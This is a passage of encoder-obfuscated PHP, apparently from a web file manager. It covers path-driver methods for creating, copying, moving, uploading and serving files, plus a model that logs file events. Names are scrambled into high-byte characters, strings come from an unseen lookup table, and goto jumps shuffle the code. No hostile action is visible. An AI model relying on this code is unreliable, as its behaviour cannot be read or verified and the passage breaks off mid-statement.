getPathOuter($»ÇÉ„) { if (!$»ÇÉ„) { return $»ÇÉ„; } $ş¿ë´‡ = $this->parse($»ÇÉ„); return KodIO::make($ş¿ë´‡[$_SERVER[É¨™èà][485]]); } public function copyFolderFromIO($²È€š£, $Ş¸ª, $ÈÍàÙ”Ï, $·Êõ™š—, $­°—ÜŞÍ) { $°öãóÆ· = $this->model->copyFolderFromIO($²È€š£, $Ş¸ª, $ÈÍàÙ”Ï, $·Êõ™š—, $­°—ÜŞÍ); return KodIO::make($°öãóÆ·); } public function isParentOf($ÁÂ„ˆåÑ, $Ä¶åì) { return $this->model->isParentOf($ÁÂ„ˆåÑ, $Ä¶åì); } public function mkfile($Ğ‘ó…ûæ, $ş¦©ô½ú = '', $Ë¹Æ¬÷ = REPEAT_RENAME) { $„ÄÎñı =& $_SERVER[É¨™èà]; $ÊÍ–‡„ë = $this->parse($Ğ‘ó…ûæ); $Ğ‘ó…ûæ = $ÊÍ–‡„ë[$„ÄÎñı[485]]; for ($ÆÑ«Ÿş = 0; $ÆÑ«Ÿş < count($ÊÍ–‡„ë[$„ÄÎñı[1449]]); $ÆÑ«Ÿş++) { $¨ø±Şø = $ÊÍ–‡„ë[$„ÄÎñı[1449]][$ÆÑ«Ÿş]; if ($ÆÑ«Ÿş == count($ÊÍ–‡„ë[$„ÄÎñı[1449]]) - 1) { $Ğ‘ó…ûæ = $this->model->mkfile($Ğ‘ó…ûæ, $¨ø±Şø, $ş¦©ô½ú, $Ë¹Æ¬÷); break; } $Ğ‘ó…ûæ = $this->model->mkdir($Ğ‘ó…ûæ, $¨ø±Şø, REPEAT_SKIP); } return $this->getPathOuter($Ğ‘ó…ûæ); } public function mkdir($ÖãåÙ¶Á, $ƒ’Æ­¥€ = REPEAT_SKIP) { $îÇˆ´šŒ =& $_SERVER[É¨™èà]; $ÏÂëÏˆ‡ = $this->parse($ÖãåÙ¶Á); $ÖãåÙ¶Á = $ÏÂëÏˆ‡[$îÇˆ´šŒ[485]]; for ($¢Ë‡Õ© = 0; $¢Ë‡Õ© < count($ÏÂëÏˆ‡[$îÇˆ´šŒ[1449]]); $¢Ë‡Õ©++) { $Ì‰‰€ù® = $ÏÂëÏˆ‡[$îÇˆ´šŒ[1449]][$¢Ë‡Õ©]; $ÖãåÙ¶Á = $this->model->mkdir($ÖãåÙ¶Á, $Ì‰‰€ù®, $ƒ’Æ­¥€); } return $this->getPathOuter($ÖãåÙ¶Á); } public function copyFile($¶Å‚ë¨, $Èºê˜¯é, $å³ØçÛß = REPEAT_REPLACE) { $÷›¥æËö =& $_SERVER[É¨™èà]; $Ú÷ëÀ’³ = $this->parse($Èºê˜¯é); $¼úÈû€Ü = $this->model->copy($¶Å‚ë¨, $Ú÷ëÀ’³[$÷›¥æËö[485]], $å³ØçÛß, $Ú÷ëÀ’³[$÷›¥æËö[87]]); return $¼úÈû€Ü ? $this->getPathOuter($¼úÈû€Ü) : !1; } public function moveFile($¾Áºç¤Ä, $ÍÄèÛü, $Ú„µÓçà = REPEAT_REPLACE) { $á›ÌÇåŒ =& $_SERVER[É¨™èà]; $¢Ñ¶ï = $this->parse($ÍÄèÛü); $Ğç•¾İ = $this->model->move($¾Áºç¤Ä, $¢Ñ¶ï[$á›ÌÇåŒ[485]], $Ú„µÓçà, $¢Ñ¶ï[$á›ÌÇåŒ[87]]); return $Ğç•¾İ ? $this->getPathOuter($Ğç•¾İ) : !1; } public function copy($óÙİ©Ñ, $æŒËÃë®, $Ğœ¿ı = REPEAT_REPLACE, $óîõ²Ä¾ = false) { $í‘İåì‹ = $this->parse($æŒËÃë®); $½ÖîÛ„ = $this->model->copy($óÙİ©Ñ, $í‘İåì‹[$_SERVER[É¨™èà][485]], $Ğœ¿ı, $óîõ²Ä¾); return $½ÖîÛ„ ? $this->getPathOuter($½ÖîÛ„) : !1; } public function moveSameAllow() { } public function move($½ııê—İ, $ËÌœ°, $‰¤şè³ô = REPEAT_REPLACE, $‡«¾Ï€Ï = false) { $‘³ëÂÄŒ = $this->parse($ËÌœ°); $ğëÏíì = $this->model->move($½ııê—İ, $‘³ëÂÄŒ[$_SERVER[É¨™èà][485]], $‰¤şè³ô, $‡«¾Ï€Ï); return $ğëÏíì ? $this->getPathOuter($ğëÏíì) : !1; } public function remove($Óš©Å÷–, $»¦…šš± = true) { return $this->model->remove($Óš©Å÷–, $»¦…šš±); } public function rename($©­¯§‡ú, $’ŠÉ§š¾) { $ôç¤Éâ¾ = $this->model->rename($©­¯§‡ú, $’ŠÉ§š¾); return $ôç¤Éâ¾ ? $this->getPathOuter($©­¯§‡ú) : $ôç¤Éâ¾; } public function size($©¬òµ´Î) { $ÎĞ¾¸Ê£ = $this->infoSimple($©¬òµ´Î); return $ÎĞ¾¸Ê£ ? $ÎĞ¾¸Ê£[$_SERVER[É¨™èà][79]] : 0; } public function infoSimple($ ÔÑø©Ñ) { return $this->model->sourceInfo($ ÔÑø©Ñ); } public function info($¢èÙ«œ) { return $this->infoParse($¢èÙ«œ); } public function infoAuth($¬üù˜¡“) { return $this->infoParse($¬üù˜¡“, !1, !0); } public function infoWithChildren($ËÒàÒëÌ) { return $this->infoParse($ËÒàÒëÌ, !0); } protected function infoParse($ìá‡Ö—Ë, $Íæ²“õš = false, $½Êñ–‡µ = false) { if (!$Íæ²“õš) { return $this->model->pathInfo($ìá‡Ö—Ë, $½Êñ–‡µ); } return $this->model->pathInfoMore($ìá‡Ö—Ë); } public function infoFullSimple($ú’²¸²ß) { $¨€Ñ“á… =& $_SERVER[É¨™èà]; $—º¨Ş“Ô = explode($¨€Ñ“á…[8], $ú’²¸²ß); $¬·Á¯Ï¦ = implode($¨€Ñ“á…[8], array_splice($—º¨Ş“Ô, 1)); return $this->model->pathInfoByPath($—º¨Ş“Ô[0], $¬·Á¯Ï¦); } public function infoFull($÷èàáïå) { $ûœíºØ = $this->infoFullSimple($÷èàáïå); return is_array($ûœíºØ) ? $this->model->pathInfo($ûœíºØ[$_SERVER[É¨™èà][194]]) : !1; } public function hashSimple($ÎÜ¾Ò½) { $æ·±ÅÇë =& $_SERVER[É¨™èà]; $äÊƒï£ = $this->infoWithChildren($ÎÜ¾Ò½); return $äÊƒï£[$æ·±ÅÇë[170]][$æ·±ÅÇë[687]]; } public function hashMd5($óšìª¾) { $Úï²ÌŞâ =& $_SERVER[É¨™èà]; $šì·Ùâ = $this->infoWithChildren($óšìª¾); return $šì·Ùâ[$Úï²ÌŞâ[170]][$Úï²ÌŞâ[559]]; } public function exist($ Š§°Ò) { $£š¥Ê =& $_SERVER[É¨™èà]; $œĞÀË„Ç = $this->parse($ Š§°Ò); if (!$œĞÀË„Ç[$£š¥Ê[87]]) { return $this->isFile($ Š§°Ò) || $this->isFolder($ Š§°Ò); } $ø±üĞÀ = array($£š¥Ê[487] => $œĞÀË„Ç[$£š¥Ê[485]], $£š¥Ê[32] => $œĞÀË„Ç[$£š¥Ê[87]]); $íûúå Í = $this->model->where($ø±üĞÀ)->find(); return $íûúå Í ? !0 : !1; } public function isFile($ÑâØ·Ä) { $±©Œî =& $_SERVER[É¨™èà]; $ÂÛ”´À = $this->infoSimple($ÑâØ·Ä); return $ÂÛ”´À && $ÂÛ”´À[$±©Œî[495]] == $±©Œî[231] ? !0 : !1; } public function isFolder($Ç³ïşïæ) { $µË¾³š =& $_SERVER[É¨™èà]; $º¢æÇÜØ = $this->infoSimple($Ç³ïşïæ); return $º¢æÇÜØ && $º¢æÇÜØ[$µË¾³š[495]] == $µË¾³š[91] ? !0 : !1; } public function listPath($×¹şø², $áêò×Û = false) { $÷”ÛñØ =& $_SERVER[É¨™èà]; if ($×¹şø² == $÷”ÛñØ[12]) { return !1; } $Ô’û—£ = array($÷”ÛñØ[487] => $×¹şø²); if ($áêò×Û) { return $this->model->listSource($Ô’û—£, -1); } return $this->model->listSource($Ô’û—£); } public function has($™©«”â¹, $Øòİ¿÷Õ = false, $ó„Ì×®· = null) { $ÈÕÜ•²Ä =& $_SERVER[É¨™èà]; $Ö›Í÷‚ = $this->infoWithChildren($™©«”â¹); if ($Øòİ¿÷Õ) { return array($ÈÕÜ•²Ä[243] => $Ö›Í÷‚[$ÈÕÜ•²Ä[243]], $ÈÕÜ•²Ä[242] => $Ö›Í÷‚[$ÈÕÜ•²Ä[242]]); } return $ó„Ì×®· ? $Ö›Í÷‚[$ÈÕÜ•²Ä[243]] : $Ö›Í÷‚[$ÈÕÜ•²Ä[242]]; } public function listAll($Í’ßúÎ÷) { $µ‘Å·¤Ô = IO::info($this->pathParse[$_SERVER[É¨™èà][87]]); if (!$µ‘Å·¤Ô) { return array(); } return $this->model->listAll($Í’ßúÎ÷); } public function getContent($ä‹¥Ù…) { return $this->model->getContent($ä‹¥Ù…); } public function setContent($Ô²Á¾÷€, $ã®µÃ­Ö = '') { return $this->model->setContent($Ô²Á¾÷€, $ã®µÃ­Ö); } public function fileSubstr($Ì©š·½, $ÚÀŞÍ†, $±ÔÚ‡) { return $this->model->fileSubstr($Ì©š·½, $ÚÀŞÍ†, $±ÔÚ‡); } public function download($•‹ìŒñÏ, $¯ğ·‚éò = '') { $ÌºİúÖ = get_path_father($¯ğ·‚éò); $è‹‹ëšÑ = get_path_this($¯ğ·‚éò); $±•Úª¿Ä = $this->model->fileInfoGet($•‹ìŒñÏ); $Á¢È¾‡ã = IO::copy($±•Úª¿Ä[$_SERVER[É¨™èà][87]], $ÌºİúÖ, !1, $è‹‹ëšÑ); return $Á¢È¾‡ã; } public function setModifyTime($™”¯í–î, $Ùä‡¦¢È = '') { $âÉ¥æ¢ã =& $_SERVER[É¨™èà]; if (!$™”¯í–î) { return; } $this->model->where(array($âÉ¥æ¢ã[501] => $™”¯í–î))->save(array($âÉ¥æ¢ã[88] => $Ùä‡¦¢È)); } public function upload($·êªŸÇ, $Óß…¶º, $¡ÏÖ¸ğß = false, $’Óş¨ÏŠ = REPEAT_REPLACE) { $¸¶œÏ£º =& $_SERVER[É¨™èà]; $şËŒÂÛ¡ = $this->parse($·êªŸÇ); $¥Ò”ûŒß = $this->model->addFile($şËŒÂÛ¡[$¸¶œÏ£º[485]], $Óß…¶º, $şËŒÂÛ¡[$¸¶œÏ£º[87]], $¡ÏÖ¸ğß, $’Óş¨ÏŠ); return $this->getPathOuter($¥Ò”ûŒß); } public function uploadFileByID($¦ßŞÕÓå, $Š·æš­¡, $…î•«Ÿ) { $«¾ÛöÈ‘ =& $_SERVER[É¨™èà]; $ÊŒÏõÅ = $this->parse($¦ßŞÕÓå); $‘™ËÛö¬ = $this->model->addFileByFileID($ÊŒÏõÅ[$«¾ÛöÈ‘[485]], $Š·æš­¡, $ÊŒÏõÅ[$«¾ÛöÈ‘[87]], $…î•«Ÿ); return $this->getPathOuter($‘™ËÛö¬); } public function addFileByRemote($ÉÄÓŞ×Š, $“œ§Ê , $Û‚Ûù‰Ó = array(), $œä†¼”Í = '', $õ¨¥â) { $×Áàµ‘„ =& $_SERVER[É¨™èà]; $·ÌÏÛ”Œ = $this->parse($ÉÄÓŞ×Š); $œä†¼”Í = empty($œä†¼”Í) ? $·ÌÏÛ”Œ[$×Áàµ‘„[87]] : $œä†¼”Í; $—†¯šŒÕ = $this->model->addFileByRemote($·ÌÏÛ”Œ[$×Áàµ‘„[485]], $“œ§Ê , $œä†¼”Í, $Û‚Ûù‰Ó, $õ¨¥â); return $this->getPathOuter($—†¯šŒÕ); } public function uploadLink($È§óÍß«, $´¿š¨Ë = 0) { $áà¼åôŞ =& $_SERVER[É¨™èà]; $ª÷Ò³“Ì = $this->parse($È§óÍß«); $‚ø›Í = _get($GLOBALS[$áà¼åôŞ[7]], $áà¼åôŞ[1450]); $Ä¸«†ë¾ = _get($GLOBALS[$áà¼åôŞ[7]], $áà¼åôŞ[1451]); $Çõ’‘º = KodIO::ioFileDriverGet($áà¼åôŞ[493] . $ª÷Ò³“Ì[$áà¼åôŞ[485]] . $áà¼åôŞ[413]); $ˆ½Ÿ‚„¸ = Model($áà¼åôŞ[689])->createFileName($ª÷Ò³“Ì[$áà¼åôŞ[87]], $Çõ’‘º, $‚ø›Í, $Ä¸«†ë¾); return IO::uploadLink($ˆ½Ÿ‚„¸, $´¿š¨Ë); } public function fileNameAuto($¯ı±£Üç, $ŸÈØ¸µÙ, $ù¨¦ÂµÒ = REPEAT_REPLACE, $ö¨¹Åöñ = false) { return $this->model->fileNameAuto($¯ı±£Üç, $ŸÈØ¸µÙ, $ù¨¦ÂµÒ, $ö¨¹Åöñ); } public function fileNameExist($¡§˜Ğâ, $Ë¸ò½˜À) { return $this->model->fileNameExist($¡§˜Ğâ, $Ë¸ò½˜À); } protected function _fileOut($â¶»û˜…, $ÍŒ¿µûø = false, $Âà¹îÆ† = false, $¿²ÔÈ¿Ç = '', $ãñ–š…å = false) { $ä¤‡¡Ùñ =& $_SERVER[É¨™èà]; $õ• œşË = $this->model->sourceInfo($â¶»û˜…); if ($õ• œşË[$ä¤‡¡Ùñ[495]] == $ä¤‡¡Ùñ[91]) { header($ä¤‡¡Ùñ[1452]); die; } $ÉáÕóĞÀ = $this->model->fileInfoGet($â¶»û˜…); $¿²ÔÈ¿Ç = $ÉáÕóĞÀ[$ä¤‡¡Ùñ[559]] ? $ÉáÕóĞÀ[$ä¤‡¡Ùñ[559]] : $¿²ÔÈ¿Ç; $•½Éğáø = isset($GLOBALS[$ä¤‡¡Ùñ[183]]) && is_array($GLOBALS[$ä¤‡¡Ùñ[183]]) ? $GLOBALS[$ä¤‡¡Ùñ[183]][$ä¤‡¡Ùñ[32]] : $õ• œşË[$ä¤‡¡Ùñ[32]]; if ($ãñ–š…å) { return IO::fileOutServer($ÉáÕóĞÀ[$ä¤‡¡Ùñ[87]], $ÍŒ¿µûø, $•½Éğáø, $¿²ÔÈ¿Ç); } IO::fileOut($ÉáÕóĞÀ[$ä¤‡¡Ùñ[87]], $ÍŒ¿µûø, $•½Éğáø, $¿²ÔÈ¿Ç); } public function fileOut($ã»ºªä», $óØÂ§”ë = false, $îƒ“öÅ• = false, $òªøıƒø = '') { $this->_fileOut($ã»ºªä», $óØÂ§”ë, $îƒ“öÅ•, $òªøıƒø); } public function fileOutServer($±ÍşÚùÅ, $ŠĞ½˜Îå = false, $€ûÊ±Ü = false, $åå½Ç = '') { $this->_fileOut($±ÍşÚùÅ, $ŠĞ½˜Îå, $€ûÊ±Ü, $åå½Ç, !0); } protected function _fileOutImage($ÂàËÒŸÌ, $Ú‹“õŒÖ = 250) { $ä”Ì®ğ¿ =& $_SERVER[É¨™èà]; $¡Õ˜€Ğ = $this->model->pathInfo($ÂàËÒŸÌ); if ($¡Õ˜€Ğ[$ä”Ì®ğ¿[495]] == $ä”Ì®ğ¿[91]) { show_json($ä”Ì®ğ¿[1453] . $ÂàËÒŸÌ, !1); } $–öôñ¢ = $this->model->fileInfoGet($ÂàËÒŸÌ); $¡Õ˜€Ğ[$ä”Ì®ğ¿[184]] = $–öôñ¢[$ä”Ì®ğ¿[87]]; $GLOBALS[$ä”Ì®ğ¿[183]] = $¡Õ˜€Ğ; IO::fileOutImage($–öôñ¢[$ä”Ì®ğ¿[87]], $Ú‹“õŒÖ); } public function fileOutImage($›öÉÇéÊ, $¼§“Ó× = 250) { $this->_fileOutImage($›öÉÇéÊ, $¼§“Ó×); } public function fileOutImageServer($«¾³¶œ, $§®»»ÎÓ = 250) { $this->_fileOutImage($«¾³¶œ, $§®»»ÎÓ); } public function link($‡”·ö°, $¤‰ş‰› = '') { $©¥“üòÚ = $this->model->fileInfoGet($‡”·ö°); return IO::link($©¥“üòÚ[$_SERVER[É¨™èà][87]], $¤‰ş‰›); } protected function parse($‰ŠÆ‘°ç) { $ÌÀŒ±áÈ =& $_SERVER[É¨™èà]; if (strstr($‰ŠÆ‘°ç, $ÌÀŒ±áÈ[8]) === !1) { return array($ÌÀŒ±áÈ[503] => intval($‰ŠÆ‘°ç), $ÌÀŒ±áÈ[87] => $ÌÀŒ±áÈ[12], $ÌÀŒ±áÈ[1449] => array()); } $ºĞ‚š÷İ = explode($ÌÀŒ±áÈ[8], trim($‰ŠÆ‘°ç, $ÌÀŒ±áÈ[8])); if (count($ºĞ‚š÷İ) < 2) { show_tips(clear_html($‰ŠÆ‘°ç) . $ÌÀŒ±áÈ[1454]); } return array($ÌÀŒ±áÈ[503] => intval($ºĞ‚š÷İ[0]), $ÌÀŒ±áÈ[87] => $ºĞ‚š÷İ[1], $ÌÀŒ±áÈ[1449] => array_slice($ºĞ‚š÷İ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($«ÑÍÈ‡Î) { $this->pathParse = $«ÑÍÈ‡Î; $this->model = Model($_SERVER[É¨™èà][1448]); } public function getPathOuter($°ÛÖ­ï§) { $Â®‘Ïó˜ =& $_SERVER[É¨™èà]; if (!$°ÛÖ­ï§) { return $°ÛÖ­ï§; } $ı‹“âÀ˜ = $this->parse($°ÛÖ­ï§); return trim(KodIO::makeShare($this->pathParse[$Â®‘Ïó˜[485]], $ı‹“âÀ˜[$Â®‘Ïó˜[485]]), $Â®‘Ïó˜[8]); } protected function infoParse($öÜóĞ¹å, $§œÌ¼£î = false, $‰¡½™áè = false) { $¦±ÕÖ¸ =& $_SERVER[É¨™èà]; $™§Ò£©á = $this->pathParse[$¦±ÕÖ¸[485]]; $ñí°´¡ = trim($this->pathParse[$¦±ÕÖ¸[1269]], $¦±ÕÖ¸[8]); return Action($¦±ÕÖ¸[1455])->sharePathInfo($™§Ò£©á, $ñí°´¡, $§œÌ¼£î); } public function infoFull($Å· ğ÷) { $·Œ…‘³¬ =& $_SERVER[É¨™èà]; $ÉƒÈ±  = explode($·Œ…‘³¬[8], trim($Å· ğ÷, $·Œ…‘³¬[8])); if (count($ÉƒÈ± ) > 1) { $¹“÷ìƒ¿ = implode($·Œ…‘³¬[8], array_splice($ÉƒÈ± , 1)); $ˆâ©‰¶Ì = $this->model->pathInfoByPath($ÉƒÈ± [0], $¹“÷ìƒ¿); if (!$ˆâ©‰¶Ì) { return !1; } $this->pathParse[$·Œ…‘³¬[1269]] = $ˆâ©‰¶Ì[$·Œ…‘³¬[194]]; } return $this->infoParse($Å· ğ÷); } public function listAll($Ó¿º©»Š) { $¼½Ú€ï” =& $_SERVER[É¨™èà]; $»ä¦¨“ = IO::info($this->pathParse[$¼½Ú€ï”[87]]); if (!$»ä¦¨“) { return array(); } $¤ƒÕ¸ÕÈ = $this->model->listAll($Ó¿º©»Š); $§ˆì“©ù = Model($¼½Ú€ï”[679])->getInfo($»ä¦¨“[$¼½Ú€ï”[680]]); foreach ($¤ƒÕ¸ÕÈ as &$éóü¼”õ) { check_abort(); $éóü¼”õ[$¼½Ú€ï”[90]] = Action($¼½Ú€ï”[1455])->_shareItemeParse($éóü¼”õ[$¼½Ú€ï”[90]], $§ˆì“©ù); } unset($éóü¼”õ); return $¤ƒÕ¸ÕÈ; } } goto AÃ—¤²‡…; B ââùÈ: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\143\145\137\145\x76\x65\156\x74"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\146\x75\156\x63\164\151\x6f\x6e"), array("\x64\145\x73\143", '', "\x69\x6e\163\x65\162\x74\x2c\165\x70\x64\x61\x74\145\54\x73\x65\x6c\145\x63\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($’½ ¬‘, $Ò§¶êÔó, $ş¢­˜† = '') { $ÍŞ™÷® =& $_SERVER[É¨™èà]; if (!$this->eventSave) { return; } $Êó¹®ò‹ = Model($ÍŞ™÷®[1448])->sourceInfo($’½ ¬‘); if (!$Êó¹®ò‹) { return !1; } if ($this->isDisableEvent($Êó¹®ò‹, $Ò§¶êÔó)) { return; } if ($ş¢­˜† && is_string($ş¢­˜†)) { $ş¢­˜† = array($ÍŞ™÷®[2038] => $ş¢­˜†); } $¨–²¸“è = defined($ÍŞ™÷®[2230]) ? USER_ID : 0; $›¢İ‚­ = array($ÍŞ™÷®[501] => $’½ ¬‘, $ÍŞ™÷®[2231] => $Êó¹®ò‹[$ÍŞ™÷®[193]], $ÍŞ™÷®[2232] => $Êó¹®ò‹[$ÍŞ™÷®[32]], $ÍŞ™÷®[594] => !empty($Êó¹®ò‹[$ÍŞ™÷®[594]]) ? $Êó¹®ò‹[$ÍŞ™÷®[594]] : $ÍŞ™÷®[12], $ÍŞ™÷®[1791] => $¨–²¸“è, $ÍŞ™÷®[506] => $Ò§¶êÔó, $ÍŞ™÷®[1793] => $ş¢­˜†); $this->addSystemLog($Ò§¶êÔó, $›¢İ‚­); unset($›¢İ‚­[$ÍŞ™÷®[2232]], $›¢İ‚­[$ÍŞ™÷®[594]]); return $this->add($›¢İ‚­); } private function addSystemLog($¼ÑşŸ, $İ²Ê×”…) { $ó¨™£«º =& $_SERVER[É¨™èà]; if ($¼ÑşŸ == $ó¨™£«º[2233]) { $¼ÑşŸ = $İ²Ê×”…[$ó¨™£«º[536]][$ó¨™£«º[2234]]; } else { if (in_array($¼ÑşŸ, array($ó¨™£«º[1979], $ó¨™£«º[2235]))) { $¼ÑşŸ = $İ²Ê×”…[$ó¨™£«º[536]][$ó¨™£«º[171]]; } } $ÌË¯¨ú¬ = array_merge($İ²Ê×”…, array($ó¨™£«º[2236] => $İ²Ê×”…[$ó¨™£«º[194]], $ó¨™£«º[2237] => $İ²Ê×”…[$ó¨™£«º[2237]])); Hook::trigger($ó¨™£«º[2238], $ó¨™£«º[2239] . $¼ÑşŸ, $İ²Ê×”…); Model($ó¨™£«º[1944])->addLog($ó¨™£«º[2239] . $¼ÑşŸ, $ÌË¯¨ú¬); } private function isDisableEvent($•Èè™Éù, $Ã—Îâåº) { $Ú‚™‡ê± =& $_SERVER[É¨™èà]; if ($•Èè™Éù[$Ú‚™‡ê±[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ã—Îâåº == $Ú‚™‡ê±[1247]) { return !1; } return !0; } public function eventCreate($—ºÂàô½, $ş©ƒú˜”) { $ÔéÉø›Š =& $_SERVER[É¨™èà]; $ª‘€‰ı = Model($ÔéÉø›Š[1448])->sourceInfo($—ºÂàô½); $æ³š”—ò = array($ÔéÉø›Š[2234] => $ş©ƒú˜”, $ÔéÉø›Š[32] => $ª‘€‰ı[$ÔéÉø›Š[32]]); return $this->addEvent($—ºÂàô½, $ÔéÉø›Š[2233], $æ³š”—ò); } public function eventFileEdit($ù‚ŠÆãå) { $·õÑàİø =& $_SERVER[É¨™èà]; $®÷ñ‚—„ = array($·õÑàİø[2240] => $_SERVER[$·õÑàİø[2241]], $·õÑàİø[2242] => strtolower(ACTION)); if (isset($GLOBALS[$·õÑàİø[7]][$·õÑàİø[2243]])) { $®÷ñ‚—„[$·õÑàİø[2243]] = $·õÑàİø[91]; } return $this->addEvent($ù‚ŠÆãå, $·õÑàİø[1969], $®÷ñ‚—„); } public function eventRecycle($ìï©àÚ¾, $—ßç½¯û) { return $this->addEvent($ìï©àÚ¾, $_SERVER[É¨™èà][2235], $—ßç½¯û); } private static $_removeLast = ''; public function eventRemove($Ö£ ”Ü) { $¤™Ó½¶è =& $_SERVER[É¨™èà]; self::$_removeLast = $Ö£ ”Ü; $‡Œ•Ş²ß = Model($¤™Ó½¶è[1448])->sourceInfo($Ö£ ”Ü); $ìÉ•áèß = array_field_key($‡Œ•Ş²ß, array($¤™Ó½¶è[194], $¤™Ó½¶è[553], $¤™Ó½¶è[515], $¤™Ó½¶è[596])); $×‘Æçöë = array($¤™Ó½¶è[171] => $‡Œ•Ş²ß[$¤™Ó½¶è[32]], $¤™Ó½¶è[2242] => ACTION, $¤™Ó½¶è[2244] => $ìÉ•áèß); return $this->addEvent($‡Œ•Ş²ß[$¤™Ó½¶è[193]], $¤™Ó½¶è[1247], $×‘Æçöë); } public function eventShare($á¯âò„‡, $Â§òÀç×) { return $this->addEvent($á¯âò„‡, $_SERVER[É¨™èà][1979], $Â§òÀç×); } public function eventMove($­˜¶‰ƒƒ, $­Ğººš, $¢‹Ş¤ƒÑ) { $§òğÏ»â =& $_SERVER[É¨™èà]; if (self::$_removeLast == $­˜¶‰ƒƒ) { return; } $ĞÖñÆ°¿ = Model($§òğÏ»â[1448]); $ôÃ¹îíÍ = $ĞÖñÆ°¿->sourceInfo($­˜¶‰ƒƒ); $£éµäÙ = $ĞÖñÆ°¿->sourceInfo($­Ğººš); $ú¾¼š¸Ø = $ĞÖñÆ°¿->sourceInfo($¢‹Ş¤ƒÑ); $¹Éî–§ = array($§òğÏ»â[1259] => $­Ğººš, $§òğÏ»â[2245] => $£éµäÙ[$§òğÏ»â[32]], $§òğÏ»â[2221] => !empty($£éµäÙ[$§òğÏ»â[594]]) ? $£éµäÙ[$§òğÏ»â[594]] : $§òğÏ»â[12], $§òğÏ»â[1260] => $¢‹Ş¤ƒÑ, $§òğÏ»â[2246] => $ú¾¼š¸Ø[$§òğÏ»â[32]], $§òğÏ»â[2247] => !empty($ú¾¼š¸Ø[$§òğÏ»â[594]]) ? $ú¾¼š¸Ø[$§òğÏ»â[594]] : $§òğÏ»â[12]); $this->addEvent($­˜¶‰ƒƒ, $§òğÏ»â[635], $¹Éî–§); $ôÃ¹îíÍ = $ĞÖñÆ°¿->sourceInfo($­˜¶‰ƒƒ); $¹Éî–§ = array($§òğÏ»â[194] => $ôÃ¹îíÍ[$§òğÏ»â[194]], $§òğÏ»â[32] => $ôÃ¹îíÍ[$§òğÏ»â[32]]); $this->addEvent($­Ğººš, $§òğÏ»â[2248], $¹Éî–§); } public function eventCopy($êí·€¤í) { $this->eventCreate($êí·€¤í, $_SERVER[É¨™èà][633]); } public function eventRename($àóÓÏï¢, $ª—°ò„õ, $Ş„Şû) { $ñ»Ø×â =& $_SERVER[É¨™èà]; $Ç™»äÓ = array($ñ»Ø×â[1259] => $ª—°ò„õ, $ñ»Ø×â[1260] => $Ş„Şû); return $this->addEvent($àóÓÏï¢, $ñ»Ø×â[1463], $Ç™»äÓ); } public function eventAddComment($¡î²èûî, $°º‡‚Ÿ›) { return $this->addEvent($¡î²èûî, $_SERVER[É¨™èà][2249], $°º‡‚Ÿ›); } public function eventAddDesc($Û²¥Æ±ƒ, $­‰ğïÊˆ) { return $this->addEvent($Û²¥Æ±ƒ, $_SERVER[É¨™èà][2250], $­‰ğïÊˆ); } public function listBySource($ÈÆ £ó®) { $»Â¡Ø æ =& $_SERVER[É¨™èà]; $İÙ´¬æœ = Model($»Â¡Ø æ[1448])->sourceInfo($ÈÆ £ó®); $ÈÖ¸óæµ = array($»Â¡Ø æ[501] => $ÈÆ £ó®); if ($İÙ´¬æœ[$»Â¡Ø æ[495]] == $»Â¡Ø æ[91]) { $æ‘±ãõº = Model($»Â¡Ø æ[1448])->listSearchChildren($ÈÆ £ó®, 20000); $æ‘±ãõº[] = $ÈÆ £ó® . $»Â¡Ø æ[316]; $ÈÖ¸óæµ = array($»Â¡Ø æ[194] => array($»Â¡Ø æ[7], $æ‘±ãõº)); } $³µçªÛ = $this->where($ÈÖ¸óæµ)->order($»Â¡Ø æ[2251])->selectPage(); if ($³µçªÛ[$»Â¡Ø æ[453]][$»Â¡Ø æ[454]] == 0) { $³µçªÛ[$»Â¡Ø æ[453]][$»Â¡Ø æ[454]] = 1; $³µçªÛ[$»Â¡Ø æ[456]] = array(array($»Â¡Ø æ[501] => $ÈÆ £ó®, $»Â¡Ø æ[2231] => $İÙ´¬æœ[$»Â¡Ø æ[193]], $»Â¡Ø æ[1791] => $İÙ´¬æœ[$»Â¡Ø æ[537]], $»Â¡Ø æ[506] => $»Â¡Ø æ[2252], $»Â¡Ø æ[507] => $İÙ´¬æœ[$»Â¡Ø æ[234]], $»Â¡Ø æ[1793] => $»Â¡Ø æ[12])); } return $this->eventListParse($³µçªÛ, $ÈÆ £ó®); } private function eventListParse($‚´ªÜ´Ê, $Ò½¯÷Ñ) { $ó¯èµÍÀ =& $_SERVER[É¨™èà]; $¦Í´«Ş´ = $‚´ªÜ´Ê[$ó¯èµÍÀ[456]]; $ÊÉ‹ü„§ = array_to_keyvalue($¦Í´«Ş´, $ó¯èµÍÀ[12], $ó¯èµÍÀ[194]); $ºìõäÂ¾ = array_to_keyvalue($¦Í´«Ş´, $ó¯èµÍÀ[12], $ó¯èµÍÀ[2237]); foreach ($¦Í´«Ş´ as $ÕßÙè) { $¬¢ıƒ½¨ = $ÕßÙè[$ó¯èµÍÀ[536]]; if ($ÕßÙè[$ó¯èµÍÀ[33]] == $ó¯èµÍÀ[635] && isset($¬¢ıƒ½¨[$ó¯èµÍÀ[1259]])) { $ÊÉ‹ü„§[] = $¬¢ıƒ½¨[$ó¯èµÍÀ[1259]] . $ó¯èµÍÀ[12]; $ÊÉ‹ü„§[] = $¬¢ıƒ½¨[$ó¯èµÍÀ[1260]] . $ó¯èµÍÀ[12]; } if ($ÕßÙè[$ó¯èµÍÀ[33]] == $ó¯èµÍÀ[2248] && isset($¬¢ıƒ½¨[$ó¯èµÍÀ[194]])) { $ÊÉ‹ü„§[] = $¬¢ıƒ½¨[$ó¯èµÍÀ[194]] . $ó¯èµÍÀ[12]; } } $ÊÉ‹ü„§ = array_merge($ÊÉ‹ü„§, $ºìõäÂ¾, array($Ò½¯÷Ñ . $ó¯èµÍÀ[12])); $ÊÉ‹ü„§ = array_unique($ÊÉ‹ü„§); $Ó¢¼¤ıÙ = array_unique(array_to_keyvalue($¦Í´«Ş´, $ó¯èµÍÀ[12], $ó¯èµÍÀ[1800])); $óµµö· = 